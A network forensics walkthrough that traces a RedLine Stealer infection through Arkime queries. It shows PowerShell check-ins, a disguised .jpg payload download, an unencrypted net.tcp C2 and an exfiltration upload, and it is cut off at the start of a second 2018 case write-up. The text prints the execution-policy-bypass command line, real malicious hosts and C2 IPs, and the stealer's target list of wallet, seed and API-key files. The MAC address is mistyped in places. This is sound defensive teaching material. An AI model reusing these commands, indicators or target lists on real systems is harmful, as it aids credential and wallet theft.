Actually uploaded: screenshot, system details, process list, one saved Edge password, Top_secret_ducment.docx Confirmed Item Value Network 10.7.10.0/24, gateway 10.7.10.1, DC/DNS/DHCP 10.7.10.9 (WIN-S3WT6LGQFVX), domain coolweathercoat.com Initial execution powershell.exe ... & 'C:\Users\rwalters\Documents\mystery_file.ps1' Check-ins hxxp://623start[.]site/?status=start&av=Windows%20Defender, /?status=install (195.161.114.3) Payload hxxp(s)://guiatelefonos[.]com/data/czx.jpg (92.118.151.9), about 353 KB over HTTPS C2 / exfil 194.26.135.119:12432, .NET net.tcp (SOAP), 542,386 bytes uploaded

docs.title: Step 0 — Data range and the big picture
docs.text:
Goal: find the start, end and size of the data and the internal hosts.

Query: time range All, empty search, Search. Start/end from Sessions sorted Start Time ascending / Stop Time descending (method in Trickbot step 1).

Actual result:

Start  2023/07/10 22:39:22 UTC
End    2023/07/10 22:39:58 UTC   (duration 00:00:36)
Sessions about 120
Src IP 10.7.10.47 (118)   10.7.10.9 (1)   0.0.0.0 (1)

SPI View → General → Dst Port (session count, protocol/port):

udp 53 (34)   tcp 88 (26)   tcp 443 (20)   tcp 389 (14)   udp 389 (7)   tcp 135 (4)   tcp 49669 (3)
tcp 80 (2)    udp 67 (1)    udp 68 (1)     udp 5353 (1)   udp 137 (1)   udp 138 (1)   udp 123 (1)
tcp 445 (1)   tcp 55390 (1) tcp 12432 (1)

Reading the result:

  • The capture is only 36 seconds, and the very first session is DHCP (0.0.0.0:68 → 255.255.255.255:67): it starts as the PC gets its IP — just booted or reconnected.
  • One internal client, 10.7.10.47, starts almost every session (118). 10.7.10.9 starts only the DHCP reply and otherwise just receives — a server. 0.0.0.0 is the DHCP request before the PC has an address.
  • Ports grouped by role:
Ports Protocols Verdict 53, 88, 389, 445, 135, 49669·55390 (dynamic RPC), 123 DNS, Kerberos, LDAP, SMB, RPC, NTP Normal AD traffic of a domain logon, all to 10.7.10.9 67/68, 137/138, 5353 DHCP, NetBIOS, mDNS Normal 443 (20) TLS Mostly Microsoft/Bing services; checked in step 5 80 (2) HTTP Cleartext — look first 12432 (1) ??? No standard service uses it — most suspicious

In a 36-second PCAP, "one unknown port" jumps out. We still fill in the basics first, because the report needs IP, MAC, hostname and account.

docs.title: Step 1 — IP, MAC and hostname from DHCP (Q2–Q4)
docs.text:
Goal: a DHCP request carries the MAC address and hostname. This PCAP starts with DHCP, so it is the most reliable source.

Query:

protocols == dhcp
Piece Meaning protocols Protocol field detected by Arkime == dhcp DHCP sessions only

SPI View → dhcp → Load All. The key fields are dhcp.host (hostname), dhcp.mac (client MAC) and dhcp.classId (vendor class). Open the sessions to see the request and reply.

Actual result:

22:39:22.849  DHCP Request   0.0.0.0:68 → 255.255.255.255:67
              Client MAC        80:86:5b:ab:1e:c4
              Host Name (12)    DESKTOP-9PEA63H
              Client FQDN (81)  DESKTOP-9PEA63H.coolweathercoat.com
              Requested IP (50) 10.7.10.47
              Vendor class (60) MSFT 5.0

22:39:22.850  DHCP ACK       10.7.10.9:67 → 255.255.255.255:68
              Your IP           10.7.10.47
              Subnet mask       255.255.255.0
              Router            10.7.10.1
              DNS server        10.7.10.9
              Domain name       coolweathercoat.com

Reading the result:

  • IP 10.7.10.47, MAC 80:86:5b1e:c4, hostname DESKTOP-9PEA63H — answers to Q2, Q3, Q4.
  • MSFT 5.0 is the DHCP vendor class every Windows version since 2000 sends — evidence of a Windows PC.
  • The DHCP reply also gives the network facts: 10.7.10.0/24 (mask 255.255.255.0), gateway 10.7.10.1, DNS and DHCP server 10.7.10.9, domain coolweathercoat.com.
  • Cross-check: ordinary packets from this PC carry Src MAC 80:86:5b:ab:1e:c4, and the NetBIOS (137) broadcast names DESKTOP-9PEA63H in domain COOLWEATHERCOAT. Two sources, same values.

When there is no DHCP

A capture that starts after the PC already had its IP has no DHCP. Then use NetBIOS names (udp 137/138 broadcast), the Kerberos cname ending in $ (next step) or host details in SMB sessions.

docs.title: Step 2 — The DC and the user account (Q5)
docs.text: Goal: find the domain controller's name and the user account that logged on to this PC.

docs.title: The DC (DNS SRV)
docs.text:
At logon a Windows PC asks DNS "where is this domain's DC?" with an SRV record query.

host.dns == _ldap._tcp.dc._msdcs.*
Piece Meaning host.dns Names queried over DNS _ldap._tcp.dc._msdcs.* The standard "where is the DC's LDAP service?" query; * = any domain after it

Actual result (DNS answers in the session detail):

Query   _ldap._tcp.dc._msdcs.coolweathercoat.com  (SRV)
Answer  SRV  win-s3wt6lgqfvx.coolweathercoat.com
Query   win-s3wt6lgqfvx.coolweathercoat.com  (A)
Answer  10.7.10.9

→ DC 10.7.10.9, name WIN-S3WT6LGQFVX. WIN- + random letters is the default name of a Windows Server that was never renamed.

docs.title: The user (Kerberos)
docs.text:
ip.src == 10.7.10.47 && protocols == krb5
Piece Meaning ip.src == 10.7.10.47 Connections started by the suspect PC && AND protocols == krb5 Kerberos sessions only

SPI View → krb5 → Load All (if only field names show, click the name or Load All).

Actual result:

cname   desktop-9pea63h$   rwalters
Realm   COOLWEATHERCOAT.COM
sname   krbtgt/COOLWEATHERCOAT.COM   ...

Reading the result:

  • desktop-9pea63h$ ends in $ — the computer account, matching step 1.
  • rwalters has no $ — the user account. Answer to Q5.
  • 26 Kerberos sessions right after the capture starts (22:39:23~) fit step 1: the PC starting and the user logging on.

docs.title: Step 3 — Odd domains in DNS
docs.text:
Goal: the names a PC looks up show where it tried to go. Remove the normal names and see what is left.

Query:

ip.src == 10.7.10.47 && protocols == dns

SPI View → dns → host.dns values; Sessions sorted by Start Time ascending shows the order.

Actual result (in time order):

22:39:23-24  _ldap._tcp... / _kerberos._tcp... SRV, WIN-S3WT6LGQFVX, wpad.coolweathercoat.com  ← AD logon
22:39:23     dns.msftncsi.com                                      ← Windows "am I online?" check
22:39:33-34  api.msn.com, assets.msn.com, www.bing.com, r.bing.com, th.bing.com,
             fp.msedge.net, k-ring.msedge.net, l-ring.msedge.net, wac-ring.msedge.net,
             fp-as-nocache.azureedge.net, fp-vs.azureedge.net, fp-afd-nocache-ccp.azureedge.net,
             static-ecst.licdn.com, v20.events.data.microsoft.com,
             sat09prdapp01-canary-opaph.netmon.azure.com, <hex>.clo.footprintdns.com   ← Windows / Edge start-up
22:39:44     checkappexec.microsoft.com                            ← SmartScreen
22:39:46     evoke-windowsservices-tas.msedge.net, client.wns.windows.com   ← Windows services
22:39:47     623start.site        → 195.161.114.3                  ← ?
22:39:49     guiatelefonos.com    → 92.118.151.9                   ← ?

Reading the result:

  • The burst of Microsoft, Bing, MSN and Azure CDN names at 22:39:33–34 is normal noise from Windows and Edge starting after logon. msedge.net, footprintdns.com, azureedge.net are Microsoft connection measurement and CDN services.
  • checkappexec.microsoft.com (22:39:44) is where Windows Defender SmartScreen asks Microsoft "is this program/file safe to run?". A legitimate service, but it appears when the user is about to run something, three seconds before the suspicious traffic. (What was checked is encrypted — inferred.)
  • The two left over, 623start.site and guiatelefonos.com, are names a company PC has no reason to visit. .site is a cheap TLD frequently abused. Step 4 shows what HTTP did with them.
  • Note for later: 194.26.135.119 (port 12432) is not in this list. The PC connected to the IP with no DNS lookup — typical of an IP hard-coded in the malware.

docs.title: Step 4 — Cleartext HTTP: PowerShell check-ins and a download
docs.text:
Goal: read the two HTTP sessions.

Query:

ip.src == 10.7.10.47 && protocols == http

SPI View → http → Load All, then open both sessions in Sessions and read Source / Destination.

Actual result — session 1 (195.161.114.3:80):

GET /?status=start&av=Windows%20Defender HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
Connection: Keep-Alive

GET /?status=install HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site

HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:39:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 14
Server: Apache/2.4.6 (CentOS) PHP/7.4.33
X-Powered-By: PHP/7.4.33

404 HTTP Error

Reading the result:

  • WindowsPowerShell/5.1 in the User-Agent — the default value added by PowerShell's Invoke-WebRequest / Invoke-RestMethod. Not a person in a browser: a PowerShell script made the request. (User-Agents can be faked, but malware rarely pretends to be PowerShell, so this is a fairly reliable clue.)
  • Split the URIs:
/?status=start                 → "the script has started"
&av=Windows%20Defender         → "the antivirus here is Windows Defender"  (%20 = space; CyberChef URL Decode)
/?status=install               → "now installing (next stage)"

The infected PC reports its status and antivirus to the attacker — a check-in. Attackers can pick a payload based on the antivirus. - The response is odd: status 200 OK (success) but the body says 404 HTTP Error (14 bytes). A real "not found" would have status 404. Possibly camouflage so that a quick glance says "page did not exist". Either way the server only records the check-ins.

Actual result — session 2 (92.118.151.9:80):

GET /data/czx.jpg HTTP/1.1
Host: guiatelefonos.com
Connection: Keep-Alive

HTTP/1.1 301 Moved Permanently
Server: nginx/1.20.2
Location: https://guiatelefonos.com:443/data/czx.jpg

Reading the result:

  • This request has no User-Agent at all. Browsers always send one. Only Host and Connection = a minimal request built by a program (for example .NET's basic web client).
  • The server redirects (301) to HTTPS, so the file itself comes over encrypted 443 — no longer visible in cleartext.
  • The name ends in .jpg, but there is no reason to fetch an "image" right after a PowerShell check-in — suspect a payload disguised as an image.
  • Timing: 22:39:47.579 start → 22:39:48.415 install → 0.8 s later 22:39:49.250 czx.jpg. It reported "install" and went straight for the payload.

docs.title: Step 5 — The HTTPS download and JA3
docs.text:
Goal: after the 301, what and how much came over HTTPS?

Query:

ip.dst == 92.118.151.9 && port.dst == 443
Piece Meaning ip.dst == 92.118.151.9 Connections to guiatelefonos.com's IP port.dst == 443 HTTPS port

Actual result (session detail):

Time          2023/07/10 22:39:49.323 - 22:39:49.874 UTC   (0.55 s)
Src           10.7.10.47:49743   Packets 61    Databytes 413
Dst           92.118.151.9:443   Packets 263   Databytes 353,715
TLS           SNI guiatelefonos.com   TLSv1.2   Cipher 0xc02f (ECDHE_RSA_WITH_AES_128_GCM_SHA256)
              JA3  3b5074b1b5d032e5620f69f9f700ff0e
              JA3S 389ed42c02ebecc32e73aa31def07e14
Certificate   Subject CN guiatelefonos.com   SAN guiatelefonos.com, www.guiatelefonos.com
              Issuer  CN R3, O Let's Encrypt
              Not Before 2023-07-08 16:17:07 UTC   Not After 2023-10-06

Reading the result:

  • Server → PC 353,715 bytes, PC → server 413 bytes: one request, about 345 KB received in half a second. Encrypted, but this is the czx.jpg from step 4 requested again over HTTPS. (TLS record overhead makes it a little bigger than the file; per the Unit 42 answers the file is a 348,160-byte RedLine executable.)
  • The certificate is a proper Let's Encrypt certificate, not self-signed — not suspicious on its own; attackers get free certificates easily. It was issued 2 days before (07-08), but Let's Encrypt certificates are renewed every 90 days anyway, so that is weak evidence. What makes this download suspicious is the context, not the certificate: PowerShell check-in → request with no User-Agent → .jpg disguise.

docs.title: What does JA3 show?
docs.text:
This PCAP is a good test of the idea "new JA3 values after infection are evidence of infection".

ip.src == 10.7.10.47 && protocols == tls

SPI View → tls → JA3:

JA3                                  count   destinations (SNI)
6271f898ce5be7dd52b0fc260d0662b3     14      www.bing.com, r.bing.com, th.bing.com, *.msedge.net, *.azureedge.net,
                                             static-ecst.licdn.com, netmon.azure.com, checkappexec.microsoft.com
3b5074b1b5d032e5620f69f9f700ff0e      3      evoke-windowsservices-tas.msedge.net (22:39:46), client.wns.windows.com (22:39:46),
                                             guiatelefonos.com (22:39:49)  ← the payload download
37f463bf4616ecd445d4a1937da06e19      2      api.msn.com, assets.msn.com
28a2c9bd18a11de089ef85a160da29e4      1      v20.events.data.microsoft.com
  • The payload download (guiatelefonos.com) has the same JA3 that Windows services (WNS etc.) used three seconds earlier, because PowerShell/.NET uses the built-in Windows TLS stack. So no new JA3 appeared after the infection.
  • And the C2 (12432) is not TLS at all, so it has no JA3.
  • In this case, "a change in the number of JA3 values" would not have caught the infection. A JA3 change is strong evidence when present, but its absence does not mean clean. On the other hand, the same JA3 going to an odd destination (SNI) instead of Microsoft services stands out — read JA3 together with destinations.

docs.title: Step 6 — Find the C2 by unusual port
docs.text:
Goal: formally find the port 12432 session seen in step 0 — a method that works on any PCAP.

Query:

ip.src == 10.7.10.47 && ip.dst != 10.0.0.0/8 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
Piece Meaning ip.src == 10.7.10.47 Connections started by the suspect PC ip.dst != 10.0.0.0/8 Destination not internal ip.dst != 224.0.0.0/4 Without multicast (224–239): mDNS, IGMP noise port.dst != 80 && … != 443 && … != 53 Without web, HTTPS, DNS

Actual result:

22:39:50.151  10.7.10.47:49744 → 194.26.135.119:12432   tcp   Packets 380/407   Databytes 542,386 / 7,179

Exactly one session remains.

Reading the result:

  • Port 12432 is not used by any standard service.
  • As step 3 showed, no DNS lookup points to this IP — it is built into the program.
  • It starts 0.3 s (22:39:50.151) after the payload download ended (22:39:49.874) — the downloaded file ran and connected immediately.
  • Above all, the PC sent 75 times more data (542,386 bytes) than it received (7,179 bytes): an upload, i.e. exfiltration.

docs.title: Step 7 — Reading the C2 session: protocol and flow
docs.text:
Goal: which protocol the 12432 session uses and what was exchanged when.

ip.dst == 194.26.135.119 && port.dst == 12432

Open the session. Arkime has no parser for this protocol, so Protocols shows only tcp and there is no HTTP or TLS section. Read the packet content (Source / Destination) as ascii — or, since it is long, download Source Raw and use CyberChef Strings.

Actual result — the first bytes the PC sent:

00 01 00 01 02 02 1f  net.tcp://194.26.135.119:12432/  03 08 0c ...

net.tcp://194.26.135.119:12432/
http://tempuri.org/Contract/MSValue1
Authorization   c75a68098b33270de4b87af925fb5ffd

Reading the result:

  • net.tcp:// is the .NET WCF (Windows Communication Foundation) net.tcp protocol: SOAP messages in a binary format over plain TCP instead of HTTP. Not as neat as cleartext HTTP, but the strings are readable. RedLine is written in .NET, so it uses this.
  • http://tempuri.org/ is the default placeholder namespace .NET tools insert when the developer sets none. Nothing is actually fetched from it. Real products usually change it before release, so tempuri.org in traffic to an external IP points to a quickly built .NET program — malware included.
  • MSValue1, MSValue2, MSValue3 are the method names called, renamed to hide their meaning.
  • Authorization c75a6809… looks like a key identifying this malware build (inferred) — useful for finding other infections from the same operator.

Flow (time order):

22:39:50.151  TCP connect (SYN → SYN-ACK → ACK)
22:39:50.425  PC → server   41 B      net.tcp preamble (address)
22:39:50.732  server → PC    1 B      preamble ack
22:39:50.753  PC → server   218 B     MSValue1  (check-in with Authorization key)
22:39:51.037  server → PC   159 B     MSValue1Response
22:39:51.042  PC → server   166 B     MSValue2  ("give me my settings")
22:39:51.347  server → PC   6,899 B   MSValue2Response  ← target list (step 8)
              ... about 5 seconds: the malware collects data on the PC ...
22:39:56.522  PC → server   541,961 B MSValue3  ← stolen data (step 9), 373 segments until 22:39:57.806
22:39:58.311  server → PC   120 B     MSValue3Response (ack)
  • "Get settings → collect for 5 seconds → upload in one go" — the textbook infostealer flow.
  • Unlike Trickbot, there is no beacon: no connection held open for minutes, no repeated check-ins. A one-shot session finished in 8 seconds — infostealers often "steal and leave". In the report's C2 field: "single short session, no repeating beacon".

docs.title: Step 8 — The server's instructions: what to steal (Q6)
docs.text:
Goal: read what MSValue2Response (server → PC, 6,899 bytes) tells the malware to steal.

Read the session's Destination side (what the server sent) as ascii, or Destination Raw → CyberChef Strings.

Actual result (excerpt):

%userprofile%\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0
%userprofile%\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0

... (about 40 Chromium-based browsers)

Electrum\wallets      Ethereum\wallets        Exodus\exodus.wallet

nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom
hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink

Reading the result — four groups:

Group Content Meaning File grabber *.txt, *.doc*, *key*, *wallet*, *seed* on Desktop and in Documents Notepad passwords, documents, wallet recovery phrases (seed). |0 looks like an option such as folder depth (inferred) Browsers User Data of about 40 Chromium-based browsers; Firefox-based (Firefox, Waterfox, Thunderbird, Pale Moon …); Steam, Battle.net Saved passwords, cookies (logged-in sessions), autofill, cards Crypto wallets Desktop wallets (Armory, Atomic, Electrum, Exodus, Monero …) and wallet extensions (Metamask, Phantom, Coinbase …). 32-letter strings like nkbihf… are Chrome extension IDs Wallet files and keys API keys / tokens AWS_…, AZURE_…, GH_TOKEN, DOCKER_PASSWORD, SLACK_TOKEN … Cloud and developer secrets stored in environment variables on developer PCs

This is the answer to Q6 (what it tried to steal). Importantly, the list is not built into the malware: the server sends it at run time. The operator can change the targets by changing the server config, so this response tells you exactly what this operator was after.

docs.title: Step 9 — What was actually uploaded
docs.text:
Goal: read what MSValue3 (PC → server, 541,961 bytes) contained. This fills the report's exfil fields (time, what, bytes, method).

Download Source Raw and open it in CyberChef; add Strings to the recipe to see readable text.

Actual result (excerpt, password masked):

3154E784D973FE3C24082CC1E80F37A9                 ← hardware ID (victim identifier)
(UTC) Coordinated Universal Time                  ← time zone
rwalters                                          ← user name
Windows 10 Pro for Workstations x64               ← OS
English (United States)                           ← language
{Width=1440, Height=900}                          ← screen size
Windows Defender                                  ← antivirus
ID: 576, Name: csrss.exe, CommandLine:
ID: 4624, Name: explorer.exe, CommandLine: C:\Windows\Explorer.EXE
ID: 5760, Name: smartscreen.exe, CommandLine: C:\Windows\System32\smartscreen.exe -Embedding
ID: 3952, Name: powershell.exe, CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command"
    "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass };
     & 'C:\Users\rwalters\Documents\mystery_file.ps1'"
...
Total of RAM  32765.05 MB
Intel(R) Core(TM) i5-10200H CPU @ 2.40GHz
Microsoft_[Edge]  Default  https://www.overcoats-r-us.com/  rwalters@coolweathercoat.com  My_p@******
Top_secret_ducment.docx  C:\Users\rwalters\Documents\Top_secret_ducment.docx  PK ... word/document.xml ...
‰PNG ... IHDR (1536 x 864) ... IDAT ... IEND      ← 534,297-byte screenshot

Reading the result — one by one:

1. System details — user, OS, language, screen size, antivirus, CPU, RAM, hardware ID. Used to identify the victim and judge whether the PC is "worth something" (high-spec, corporate domain).

2. Process list and how it started — the most important clue is here:

powershell.exe "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\rwalters\Documents\mystery_file.ps1'"
Piece Meaning Get-ExecutionPolicy Check the current PowerShell script execution policy -ne 'AllSigned' If it is not "only signed scripts" … Set-ExecutionPolicy -Scope Process Bypass … bypass the policy for this PowerShell window only & '…\mystery_file.ps1' Run mystery_file.ps1 from Documents

This command line is exactly what Windows builds when you right-click a .ps1 file in Explorer and choose "Run with PowerShell" — strong evidence that the user ran a downloaded script themselves (inferred). The SmartScreen check at 22:39:44 (step 3) and the smartscreen.exe process fit the same picture. This is the execution stage.

3. Password saved in Edge — the account rwalters@coolweathercoat.com for https://www.overcoats-r-us.com/ and its password were uploaded in cleartext. Again the username is a company e-mail — check whether the company password is the same.

4. A document — C:\Users\rwalters\Documents\Top_secret_ducment.docx, caught by the "*.doc* in Documents" rule from step 8. The whole docx follows, starting with PK (a .docx is really a zip). Its text: This is a top secret document. For my eyes only! Do not view this! — a practice document, but in real life this is a confidential document leak to report.

5. A screenshot — a 534,297-byte PNG (1536×864) from ‰PNG (hex 89 50 4E 47) to IEND. 98% of the upload is this image. Use CyberChef Extract Files, or cut from the 0x89 byte and use Render Image.

Capture loss breaks the image

One TCP segment (1,459 bytes) is missing from the upload in this PCAP (Arkime/Wireshark: "previous segment not captured"). Only about the top third of the image decodes; the rest is corrupted. The intact part shows the desktop and a PowerShell window displaying 404 HTTP Error and StatusCode : 200 — the response from 623start.site. So the script ran without hiding its window, and it matches the HTTP response from step 4 exactly.

Summary — exfil checklist:

Time     22:39:56.522 - 22:39:57.806 UTC (upload), acknowledged 22:39:58.311
What     screenshot (534 KB), system info, process list, 1 Edge credential, Top_secret_ducment.docx
Bytes    541,961 (MSValue3), 542,386 total client data in the session
Method   .NET net.tcp binary SOAP over raw TCP 12432 to 194.26.135.119 (unencrypted)

docs.title: Step 10 — Scope
docs.text:
Goal: check whether the PC tried to spread to other internal hosts.

ip.src == 10.7.10.47 && ip.dst == 10.7.10.0/24 && ip.dst != 10.7.10.9
Piece Meaning ip.dst == 10.7.10.0/24 Connections to the internal network ip.dst != 10.7.10.9 Without the DC

Actual result:

22:39:23.138  udp 137 → 10.7.10.255:137   (NetBIOS name broadcast)
22:39:26.828  udp 138 → 10.7.10.255:138   (NetBIOS browser broadcast)

Reading the result: only two broadcasts (.255); no SMB, RPC or RDP to other hosts. No lateral movement. This PCAP has no other internal PCs, so "are other PCs infected?" cannot be answered here. In a real network, search for other hosts talking to the IOC IPs, as in Trickbot step 18:

ip.dst == [195.161.114.3, 92.118.151.9, 194.26.135.119] && ip.src != 10.7.10.47

docs.title: Conclusion
docs.text:
22:39:22  PC boots / user rwalters logs on (DHCP, Kerberos, LDAP)
22:39:44  SmartScreen check (checkappexec.microsoft.com)
22:39:47  mystery_file.ps1 runs → PowerShell reports "start, AV = Windows Defender" to 623start.site
22:39:48  reports "install"
22:39:49  fetches czx.jpg from guiatelefonos.com → 301 → HTTPS download (~345 KB, RedLine)
22:39:50  RedLine connects to 194.26.135.119:12432 (net.tcp), gets target list
22:39:56  uploads screenshot, system info, Edge password, document (~542 KB)
22:39:58  server acknowledges — done in 11 seconds from first check-in

docs.title: Timeline
docs.text: UTC (2023-07-10) Event 22:39:22 DHCP: DESKTOP-9PEA63H gets 10.7.10.47 22:39:23–24, 22:39:32–33 Domain logon (DNS SRV, LDAP, Kerberos rwalters, SMB/RPC to DC) 22:39:33–35 Windows/Edge start-up traffic (MSN, Bing, Microsoft CDN) 22:39:44 SmartScreen check checkappexec.microsoft.com 22:39:47.579 PowerShell → 623start[.]site/?status=start&av=Windows%20Defender 22:39:48.415 PowerShell → 623start[.]site/?status=install 22:39:49.250 guiatelefonos[.]com/data/czx.jpg (HTTP, no User-Agent) → 301 22:39:49.323–49.874 About 353 KB downloaded over HTTPS 22:39:50.151 Connection to 194.26.135.119:12432 (net.tcp) 22:39:51.347 Server sends the target list (6,899 B) 22:39:56.522–57.806 Exfil upload 541,961 B 22:39:58.311 Server acknowledges; capture ends

docs.text: Technique Evidence T1204.002 User Execution: Malicious File "Run with PowerShell" style command line (inferred) T1059.001 PowerShell mystery_file.ps1, WindowsPowerShell User-Agent T1518.001 Security Software Discovery av=Windows%20Defender report T1105 Ingress Tool Transfer czx.jpg download T1036 Masquerading Executable named .jpg T1082 System Information Discovery, T1057 Process Discovery Uploaded system details and process list T1555.003 Credentials from Web Browsers Saved Edge password T1005 Data from Local System Top_secret_ducment.docx, file-grabber rules T1113 Screen Capture PNG screenshot T1571 Non-Standard Port, T1095 Non-Application Layer Protocol TCP 12432, net.tcp T1041 Exfiltration Over C2 Channel MSValue3 upload

docs.title: Compared with the Trickbot case
docs.text:
Two malware families that both steal data leave very different shapes on the network. Knowing the differences helps narrow down the family in the next PCAP.

Trickbot (2020) RedLine Stealer (2023) Initial execution Script (WinHttp.WinHttpRequest.5) downloads an EXE User runs a .ps1; PowerShell checks in Payload disguise EXE named .png EXE named .jpg, fetched over HTTPS C2 protocol HTTP POST (8082) + TLS (447/449, self-signed) .NET net.tcp (SOAP), unencrypted, port 12432 C2 address Raw IP Raw IP (no DNS) Traffic pattern C2 held open for minutes + module downloads, stays active Get config → collect → upload once, done in 8 seconds Stolen Browser passwords, Firefox tokens, recon (nltest etc.) Screenshot, system details, browser password, document, (per list) wallets and API keys Next move Domain recon, SMB lateral-movement attempt No lateral movement Stand-out clues Hostname and bot ID in URI, fake IE7 UA WindowsPowerShell UA, tempuri.org, upload ≫ download

Also remember what they share: raw-IP connections, non-standard ports, disguised file names and sessions whose upload dwarfs the download were key clues in both.

docs.title: Compared with the official Unit 42 answers
docs.text:
Question This analysis Unit 42 answer Match Infection start 2023-07-10 22:39 UTC (22:39:47) 2023-07-10 22:39 UTC ✓ IP 10.7.10.47 10.7.10[.]47 ✓ MAC 80:86:5b1e:c4 80:86:5b1e:c4 ✓ Hostname DESKTOP-9PEA63H DESKTOP-9PEA63H ✓ User rwalters rwalters ✓ Targeted information Desktop/Documents files, browser data, wallets, API keys and credentials + actual upload contents Same categories (files, browsers, wallets, API keys and credentials) ✓

The official write-up found the hostname via NetBIOS and the account via Kerberos; this page used DHCP and Kerberos. Different routes, same answers — two sources are better than one.

docs.title: Copy-ready query sheet
docs.text:
Replace <…>.

Host information

protocols == dhcp

host.dns == _ldap._tcp.dc._msdcs.*

ip.src == <host-IP> && protocols == krb5

Finding the suspicious traffic

ip.src == <host-IP> && protocols == dns

ip.src == <host-IP> && protocols == http

http.user-agent == *WindowsPowerShell*

ip.src == <host-IP> && protocols == tls

ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53

ip.dst == <C2-IP> && port.dst == <port>

Big uploads (exfil candidates)

ip.src == <host-IP> && databytes.src > 100000 && ip.dst != <internal-CIDR>

Scope

ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>

ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>

CyberChef recipes used

Recipe Used for URL Decode URIs like av=Windows%20Defender Strings Readable text from net.tcp data exported with Source/Destination Raw Extract Files Carving the PNG and docx out of the upload Render Image Viewing the carved screenshot Unzip Reading word/document.xml inside the docx (a zip)

docs.title: Lessons learned
docs.text:
• The shorter the PCAP, the faster "one unknown port" shows. Group the ports by role and 12432 jumps out of the normal AD traffic.
  • DHCP gives IP, MAC and hostname at once. A capture that starts with DHCP was recording from the moment the PC came up.
  • A WindowsPowerShell User-Agent and a request with no User-Agent both mean "a program, not a person".
  • Responses that contradict themselves (status 200 with a "404" body) may be camouflage.
  • A proper certificate (Let's Encrypt) does not mean safe. Judge by context.
  • No JA3 change does not mean clean. Here the payload download shared a JA3 with Windows services and the C2 was not even TLS.
  • Sessions where upload ≫ download are the first exfil candidates (databytes.src).
  • Unencrypted C2 shows both the orders and the loot. Report "what was targeted" (the server's list) separately from "what was lost" (the upload).
  • Record capture loss. A missing segment damaged part of the evidence (the screenshot) — the report should say so.

docs.title: Sorting through the alerts — hacked church site to a fake Chrome update, a WScript C2, a 349 KB payload and failed follow-on C2 (Splunk first, Arkime second)
Sorting through the alerts — fake Chrome update to WScript C2 and follow-on C2 attempts
docs.text:
Case summary

malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts", worked step by step on the home-lab pcapbox VM with Splunk (Zeek logs) as the main tool and Arkime only where Splunk cannot see (page and POST contents). One Windows 7 PC (CONSERVATOR-PC, user lloyd.maxwell) opens a hacked church website. Script hidden in the site sends the browser through a fingerprinting redirector (TDS) to a fake "Update Chrome" page, which downloads Chrome_72.3.22.js from Dropbox. 46 seconds later the user runs it: wscript.exe sends three XOR-encoded POSTs (host, user, domain, process list) to a C2 and gets back a 349 KB encoded payload, reported as Chrome_72.3.22.exe in %TEMP%. Ten seconds later the PC starts trying two hard-coded C2 IPs every ~7.5 minutes — one refuses, one never answers. Ends with one simple Snort rule and a short report.

Evidence 2018-06-30-traffic-analysis-exercise.pcap — 2018-06-30 20:27:15 – 20:59:06 UTC (31.9 min) Source malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts" Given LAN 172.16.2.0/24, DC 172.16.2.9, domain fabulousdukes.com Environment Closed network. pcapbox VM: Splunk (index=zeek, case field pcap_case), Arkime (tag = case name), Snort 2.9.20, CyberChef. No Wireshark. Case name 20180630_SORTING_THROUGH_THE_ALERTS Deliverables Analysis, decoded download URL and C2 bodies, one Snort rule Related pages Night Dew (pcapbox, Snort test guide) · BEGUILESOFT (Splunk-first baselining) · SPL cheat sheet · Arkime search syntax · Zeek logs

How to read this page

This is the case as it was actually worked: every result block is what the analyst's Splunk or Arkime showed. Each step goes Goal → Splunk → Arkime (only when Splunk cannot show it) → Result → Reading the result. Every SPL query is explained line by line. Question boxes are questions asked during the work, with their answers.

Statements are marked where it matters: [data] = seen in Splunk or Arkime, [inference] = a conclusion drawn from the data and still to be proven.

The indicators on this page are real

Domains, IPs and hashes come from real 2018 malware traffic. Prose and tables are defanged (hxxp, [.]); code blocks keep values as typed. Do not visit them. Do not run anything you extract.

docs.title: Answers at a glance
docs.text: Item Answer Status Infected PC 172.16.2.169, CONSERVATOR-PC, Windows 7 x64 Confirmed (Kerberos, NTLM, DNS) User lloyd.maxwell (domain FABULOUSDUKES) Confirmed DC 172.16.2.9, FABULOUSDUKE-DC Confirmed First malicious event 20:27:53 UTC — visit to the hacked site www.stmarybahrain[.]com (66.226.144.232), no Referer Confirmed Redirect chain Site script → track.positiverefreshment[.]org/s_code.js (185.244.149.74, browser fingerprint) → fake page lw2e.sineadhollywoodnutt[.]com/topics/index.php (93.95.100.178) Confirmed Download hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1 at 20:28:00–01, ~23 KB received URL decoded; download proven by SNI and timing; content not visible (HTTPS) Execution 20:28:47 — wscript.exe POSTs to bb17eb22.login3.kimbrelelectric[.]com/blank.gif (93.95.100.138) Confirmed (body b= shows the script path and wscript.exe) Data sent Script path, host, user, domain, AV name, screen, process list Confirmed (decoded) Payload 349 KB hex reply → reported as C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe Path confirmed; execution inferred from what 